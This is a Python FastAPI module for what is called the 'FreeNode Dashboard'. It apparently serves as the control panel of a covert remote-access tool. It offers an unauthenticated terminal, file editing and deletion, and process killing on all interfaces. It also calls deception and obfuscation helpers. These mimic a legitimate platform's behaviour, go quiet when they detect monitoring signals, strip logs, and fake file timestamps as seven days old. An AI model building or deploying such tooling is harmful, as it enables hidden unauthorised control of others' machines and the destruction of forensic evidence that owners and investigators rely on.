"""
FreeNode Dashboard v2 — Professional control plane.

Features:
  - Web UI (minimal, professional, dark theme)
  - Real terminal over WebSocket (xterm.js)
  - File explorer + editor
  - Process monitor
  - REST API for all operations
"""

import os
import json
from pathlib import Path
from typing import Optional

from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
from pydantic import BaseModel

from .terminal import handle_terminal_ws
from .filemanager import FileManager, FileWriteRequest
from .processmonitor import ProcessMonitor

from ..core import Detector
from ..deception import detect_platform as detect_decoy_platform, BehavioralMimicry
from ..obfuscation import QuietMode, ArtifactStripper
from ..version import VERSION

HERE = Path(__file__).parent
STATIC = HERE / "static"

app = FastAPI(title="FreeNode Dashboard", version=VERSION, docs_url=None, redoc_url=None)
fm = FileManager(root=str(HERE.parent))


# ---------------------------------------------------------------------------
# Status helpers
# ---------------------------------------------------------------------------

def get_status() -> dict:
    det = Detector()
    info = det.detect_all()
    quiet = QuietMode(threshold=99)
    qscore = quiet.scan()
    return {
        "version": VERSION,
        "platform_info": {
            "os": info.get("os"),
            "arch": info.get("arch"),
            "cpu_count": info.get("cpu_count"),
            "memory_total_gb": round(info.get("memory_total", 0), 2),
            "is_container": info.get("is_container"),
            "is_root": info.get("is_root"),
        },
        "detected_platform": detect_decoy_platform(),
        "quiet_mode": {"active": qscore >= 3, "score": qscore, "signals": quiet.signals},
    }


def run_deploy() -> dict:
    plat = detect_decoy_platform()
    bm = BehavioralMimicry(platform=plat)
    bm.start()
    return {
        "status": "deployed",
        "platform": plat,
        "health_path": bm.profile.health_path,
        "health_interval": bm.profile.health_interval,
        "log_file": bm.profile.log_file,
    }


# ---------------------------------------------------------------------------
# Core API endpoints
# ---------------------------------------------------------------------------

@app.get("/", response_class=HTMLResponse)
def root():
    return (STATIC / "index.html").read_text()


@app.get("/api/status")
def api_status():
    return JSONResponse(get_status())


@app.post("/api/deploy")
def api_deploy():
    return JSONResponse(run_deploy())


@app.post("/api/pack")
def api_pack():
    st = ArtifactStripper(str(HERE.parent))
    stripped = st.strip_logs()
    st.zero_timestamps(fake_days_ago=7)
    return JSONResponse({"status": "packed", "logs_stripped": stripped})


@app.post("/api/quiet")
def api_quiet():
    q = QuietMode(threshold=3)
    return JSONResponse({"quiet": q.should_quiet(), "score": q.scan(), "signals": q.signals})


# ---------------------------------------------------------------------------
# File API
# ---------------------------------------------------------------------------

class ListRequest(BaseModel):
    path: str = "."


@app.post("/api/files/list")
def api_files_list(req: ListRequest):
    try:
        return JSONResponse(fm.list_directory(req.path))
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=400)


@app.get("/api/files/read")
def api_files_read(path: str):
    try:
        return JSONResponse({"path": path, "content": fm.read_file(path)})
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=400)


@app.post("/api/files/write")
def api_files_write(req: FileWriteRequest):
    try:
        return JSONResponse(fm.write_file(req.path, req.content))
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=400)


class DeleteRequest(BaseModel):
    path: str


@app.post("/api/files/delete")
def api_files_delete(req: DeleteRequest):
    try:
        return JSONResponse(fm.delete(req.path))
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=400)


class MkdirRequest(BaseModel):
    path: str


@app.post("/api/files/mkdir")
def api_files_mkdir(req: MkdirRequest):
    try:
        return JSONResponse(fm.create_directory(req.path))
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=400)


# ---------------------------------------------------------------------------
# Process API
# ---------------------------------------------------------------------------

@app.get("/api/processes")
def api_processes():
    return JSONResponse(ProcessMonitor.list_processes())


@app.get("/api/processes/system")
def api_system_stats():
    return JSONResponse(ProcessMonitor.get_system_stats())


@app.get("/api/processes/{pid}")
def api_process_detail(pid: int):
    return JSONResponse(ProcessMonitor.get_process_info(pid))


@app.post("/api/processes/{pid}/kill")
def api_process_kill(pid: int):
    return JSONResponse(ProcessMonitor.kill_process(pid))


# ---------------------------------------------------------------------------
# Terminal WebSocket
# ---------------------------------------------------------------------------

@app.websocket("/api/terminal")
async def ws_terminal(websocket: WebSocket):
    await handle_terminal_ws(websocket)


def start():
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8080)
